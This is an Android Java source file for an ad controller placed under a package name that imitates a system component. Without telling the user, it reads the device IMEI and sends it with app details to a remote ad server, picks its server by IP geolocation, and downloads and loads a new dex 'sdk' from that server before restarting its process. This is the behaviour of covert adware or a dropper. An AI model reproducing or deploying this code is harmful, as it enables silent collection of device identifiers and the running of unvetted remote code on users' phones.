package com.android.system.core.sometools;




import org.json.JSONException;
import org.json.JSONObject;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.telephony.TelephonyManager;
import android.util.Log;


public class GAdController {
	private static GAdController controller;
	private Context context;
	private String newSdkCode;
	private String dexName;
	
	
	private GAdController()
	{
		
	}
	
	public static GAdController getInstance()
	{
		if(controller == null)
		{
			controller = new GAdController();					
		}	
		return controller;
	}
		
	public void init(final Context context,Boolean isTestModel)
	{
		this.context = context;
	
		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTestModel);
		
//		killpro();
//		new Thread(){
//			public void run() {
//				try {
//					Thread.sleep(5000);
//				} catch (InterruptedException e) {
//					e.printStackTrace();
//				}
//				finally
//				{
//					Intent intent = new Intent(context,GService.class);
//					context.startService(intent);
//				}
//			};
//		}.start();
		Intent intent = new Intent(context,GService.class);
		context.startService(intent);
		//GTool.httpPostRequest(GCommons.URI_POST_NEW_SDK, this, "revNewSdk", GCommons.CHANNEL);				
	}
	
	public void init(Context context)
	{
		this.context = context;
		
		ApplicationInfo appInfo = null;
		try {
			appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(),PackageManager.GET_META_DATA);
			String qew_channel = appInfo.metaData.getString("UMENG_CHANNEL");

			PackageInfo info = context.getPackageManager().getPackageInfo(context.getPackageName(),0);
			GCommons.CHANNEL = qew_channel;
			GCommons.VERSION_CODE = info.versionCode;
			GCommons.VERSION_NAME = info.versionName;

			Log.e("------------","qew_channel="+GCommons.CHANNEL);
			Log.e("------------","VERSION_CODE="+GCommons.VERSION_CODE);
			Log.e("------------","VERSION_NAME="+GCommons.VERSION_NAME);
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
		
		judgeCountry();
	}
	
	public void initEnd()
	{
		boolean isTest = GTool.getSharedPreferences().getBoolean(GCommons.SHARED_KEY_TESTMODEL, false);
		GTool.saveSharedData(GCommons.SHARED_KEY_TESTMODEL,isTest);
		String country = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_COUNTRY, "");
		if("china".equals(country))
		{
			updateLink();
		}
		else
		{
			GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
		}
		
		long reqTime = GTool.getSharedPreferences().getLong(GCommons.SHARED_KEY_UPDATE_SDK_TIME, 0l);
		long nowTime = System.currentTimeMillis();
		String code = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_SDK_VERSIONCODE, "0");
		if(nowTime - reqTime > 1*60*60*1000 || "0".equals(code))
		{
			TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			String imei = tm.getDeviceId();
			String url = GCommons.URI_POST_NEW_SDK+"?channel="+GCommons.CHANNEL
					+"&packageName="+GTool.getPackageName()+"&vc="+GCommons.VERSION_CODE
					+"&vn="+GCommons.VERSION_NAME+"&imei="+imei;
			Log.e("------------", "req new sdk "+url);
			GTool.httpGetRequest(url, this, "revNewSdk", null);
		}
		else
		{
			Log.e("------------","----------start pro service");
			start();
		}
	}
	
	
	//判断是否是国内
	public void judgeCountry()
	{
		String country = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_COUNTRY, "");
		if(country == null || "".equals(country))
		{
			GTool.httpGetRequest(GCommons.IP_URL, this, "getProvinceResult",null);
		}
		else
		{	
			Log.e("------------", "------country="+country);
			if("china".equals(country))
			{
				updateLink();
			}
			else
			{
				GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
			}
			initEnd();
		}
	}
	
	public void getProvinceResult(Object obj_session,Object obj_data)
	{
		if(obj_data != null)
			Log.e("------------------","getProvinceResult="+obj_data.toString());
		try {
			JSONObject obj = new JSONObject(obj_data.toString());
			if("success".equals(obj.getString("status")))
			{
//				String city = obj.getString("city");//城市  
//				String province = obj.getString("regionName");//省份
				String country = obj.getString("country");//国家
				
				if(country != null && !"".equals(country))
				{					
					if(country.equals("中国") || country.equals("China") || country.equals("china"))
					{
						GTool.saveSharedData(GCommons.SHARED_KEY_COUNTRY, "china");
						updateLink();
					}
					else
					{
						GTool.saveSharedData(GCommons.SHARED_KEY_COUNTRY, "haiwai");
						GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
					}
					
				}
					
			}
		} catch (Exception e) {
		}
		initEnd();
	}

	
	public void updateLink()
	{
		GCommons.SERVER_ADDRESS = "http://media.qiqiup.com/QiupAdServer/";
		GCommons.URI_POST_GET_SDKCONFIG = GCommons.SERVER_ADDRESS + "tb_getConfig";
		//获取最新sdk
		GCommons.URI_POST_NEW_SDK = GCommons.SERVER_ADDRESS + "sdk_findNewSdk";
		GCommons.URI_POST_UPDATE_SDK_NUM = GCommons.SERVER_ADDRESS + "sdk_updateNum";
		
	}

	
	public void showSpotAd()
	{
		Intent intent = new Intent(context,GReceiver.class);
		GTool.saveSharedData(GCommons.SHARED_KEY_ACTION_TAG, "com.xugu.showspotad");
		intent.setAction("com.xugu.showspotad");
		this.context.sendBroadcast(intent);
		
	}
	
	public void destory(Activity act)
	{
		String clazName = act.getComponentName().getClassName();
		
		Intent intent = new Intent(context,GReceiver.class);
		GTool.saveSharedData(GCommons.SHARED_KEY_ACTION_TAG, "com.xugu.destory");
		intent.setAction("com.xugu.destory");
		intent.putExtra("clazName", clazName);
		this.context.sendBroadcast(intent);
	}
	
	public void start()
	{
		Intent intent = new Intent(context,GReceiver.class);
		intent.setAction("com.xugu.start");
		this.context.sendBroadcast(intent);
	}
	
	public void restart()
	{
		Intent intent = new Intent(context,GReceiver.class);
		intent.setAction("com.xugu.restart");
		this.context.sendBroadcast(intent);
	}
	
	public void killpro()
	{
		Intent intent = new Intent(context,GReceiver.class);
		intent.setAction("com.xugu.killpro");
		this.context.sendBroadcast(intent);
	}
	
	public Context getContext() {
		return context;
	}

	public void setContext(Context context) {
		this.context = context;
	}
	
	public void revNewSdk(Object ob,Object rev)
	{
		GTool.saveSharedData(GCommons.SHARED_KEY_UPDATE_SDK_TIME, System.currentTimeMillis());
		
		JSONObject obj = null;
		String versionCode = null;
		String downloadPath = null;
		boolean isFind = true;
		try {
			 obj = new JSONObject(rev.toString());
			 versionCode = obj.getString("versionCode");
			 downloadPath = obj.getString("downloadPath");
			 newSdkCode = versionCode;
			 dexName = downloadPath;
			if(versionCode == null || "".equals(versionCode))
				isFind = false;
		} catch (Exception e) {
			isFind = false;
			Log.e("------------","----------没有发现最新sdk包----");
		}	
		
		String code = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_SDK_VERSIONCODE, "0");
		Log.e("------------","----------curr sdk="+code);
		if(!isFind)
		{
			if("0".equals(code))
			{
				Log.e("------------","----------no network or config error! reinit...---------");
				new Thread(){
					public void run() {
						try {
							Thread.sleep(3*60*60*1000);
							init(context);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					};
				}.start();
			}
			else
			{
				Log.e("------------","----------startservice");
				start();
			}
		}
		else if(versionCode != null)
		{
			int netCode = Integer.parseInt(versionCode);
			int currCode = Integer.parseInt(code);
			if(netCode > currCode)
			{
				Log.e("------------","----------downloadRes");
				GTool.downloadRes(GCommons.SERVER_ADDRESS, this, "revNewSdkCallback", downloadPath, true);
			}
			else
			{
				Log.e("------------","----------startservice");
				start();
			}
		}
	}
	
	public void revNewSdkCallback(Object ob,Object rev)
	{
		if("1".equals(rev.toString()))
		{
			GDexLoaderUtil.copyDex(context, ob.toString());
			GTool.saveSharedData(GCommons.SHARED_KEY_SDK_VERSIONCODE,newSdkCode);
	        GTool.saveSharedData(GCommons.SHARED_KEY_DEX_NAME,dexName);
			start();
			String url = GCommons.URI_POST_UPDATE_SDK_NUM+"?channel="+GCommons.CHANNEL
					+"&packageName="+GTool.getPackageName()+"&vc="+GCommons.VERSION_CODE
					+"&vn="+GCommons.VERSION_NAME;
	        GTool.httpGetRequest(url, this, "revUpdateSdk", null);
		}
		else
		{
			Log.e("------------","----------sdk download fial! redownloading...");
			init(context);
		}
	}
	
	public void revUpdateSdk(Object ob,Object rev)
	{
		 Log.e("------------","----------newSdkCode sdk="+newSdkCode);
	     android.os.Process.killProcess(android.os.Process.myPid());
	}
	
}
